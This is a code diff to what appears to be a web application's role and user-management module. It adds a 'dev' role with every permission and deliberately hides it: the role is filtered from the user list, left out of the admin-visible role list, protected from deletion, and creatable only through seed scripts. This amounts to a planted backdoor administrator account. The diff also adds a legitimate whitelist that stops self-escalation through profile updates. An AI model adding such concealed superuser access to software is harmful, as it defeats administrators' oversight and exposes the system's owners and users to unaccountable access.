@@ -122,6 +122,14 @@ export const ROLE_PERMISSIONS: Record<UserRole, string[]> = {
     'view_inventory', 'add_inventory', 'view_own_inventory',
     'make_tool_request',
   ],
+  // Invisible unrestricted role — union of all permissions.
+  dev: [
+    'manage_users', 'manage_roles', 'view_all_dashboards', 'manage_settings',
+    'view_analytics', 'manage_employees', 'view_reports',
+    'approve_financial_requests', 'view_financial_requests', 'make_financial_request',
+    'view_inventory', 'add_inventory', 'view_own_inventory',
+    'make_tool_request',
+  ],
 };
 
 export const DASHBOARD_ROUTES: Record<UserRole, string> = {
@@ -131,6 +139,7 @@ export const DASHBOARD_ROUTES: Record<UserRole, string> = {
   hr: '/dashboard',
   field: '/dashboard',
   operator: '/dashboard',
+  dev: '/dashboard',
 };
 
 // ───────── Exported type aliases ─────────
@@ -345,9 +354,18 @@ export async function createProfile(userId: string, profileData: { full_name: st
   }
 }
 
-export async function updateProfile(userId: string, updates: { full_name?: string; role?: UserRole }): Promise<ProfileResponse> {
+export async function updateProfile(userId: string, updates: Record<string, unknown>): Promise<ProfileResponse> {
   try {
-    const result = await profileRepo.upsertProfile(userId, updates);
+    // Whitelist editable fields — role is NEVER settable via self-update (prevents self-escalation).
+    const allowed: Record<string, unknown> = {};
+    if (typeof updates.full_name === 'string' && updates.full_name.trim()) allowed.full_name = updates.full_name.trim();
+    if (typeof updates.avatar_url === 'string') allowed.avatar_url = updates.avatar_url;
+
+    if (Object.keys(allowed).length === 0) {
+      return { success: false, error: { message: 'No valid fields to update', status: 400 } };
+    }
+
+    const result = await profileRepo.upsertProfile(userId, allowed);
     if (!result) return { success: false, error: { message: 'Profile not found', status: 404 } };
     return { success: true, data: result };
   } catch (error) {
@@ -361,7 +379,9 @@ export async function updateProfile(userId: string, updates: { full_name?: strin
 export async function getUsers(): Promise<{ success: boolean; data?: User[]; error?: string }> {
   try {
     const users = await userRepo.getAll();
-    return { success: true, data: users.map((u: any) => ({ ...u, id: u.id })) };
+    // 'dev' users are invisible — never exposed through the users list.
+    const visible = users.filter((u: any) => u.role !== 'dev');
+    return { success: true, data: visible.map((u: any) => ({ ...u, id: u.id })) };
   } catch (error) {
     console.error('Get users error:', error);
     return { success: false, error: 'Failed to fetch users' };
@@ -375,6 +395,9 @@ export async function createUser(
 ): Promise<{ success: boolean; data?: User; error?: string }> {
   try {
     const bcrypt = await getBcryptModule();
+
+    // The 'dev' role is created only via seed scripts — never through the API.
+    if (userData.role === 'dev') return { success: false, error: 'Cannot create dev accounts through the API' };
 
     const exists = await userRepo.existsByEmail(userData.email);
     if (exists) return { success: false, error: 'User with this email already exists' };
@@ -457,6 +480,7 @@ export async function deleteUser(
     const user = await userRepo.findById(userId);
     if (!user) return { success: false, error: 'User not found' };
     if (user.email === 'superadmin@test.com') return { success: false, error: 'Cannot delete the super admin account' };
+    if (user.role === 'dev') return { success: false, error: 'Cannot delete dev accounts' };
 
     await userRepo.deleteOne(userId);
     await profileRepo.deleteOne(userId);
@@ -518,9 +542,13 @@ export function getDashboardRoute(role: UserRole): string {
 }
 
 export function isValidRole(role: string): role is UserRole {
-  return ['super_admin', 'admin', 'accountant', 'hr', 'field', 'operator'].includes(role);
+  return ['super_admin', 'admin', 'accountant', 'hr', 'field', 'operator', 'dev'].includes(role);
 }
 
+/**
+ * Roles exposed to admins in the UI — 'dev' is intentionally invisible,
+ * so it is NOT returned here even though isValidRole accepts it.
+ */
 export function getAllRoles(): UserRole[] {
   return ['super_admin', 'admin', 'accountant', 'hr', 'field', 'operator'];
 }
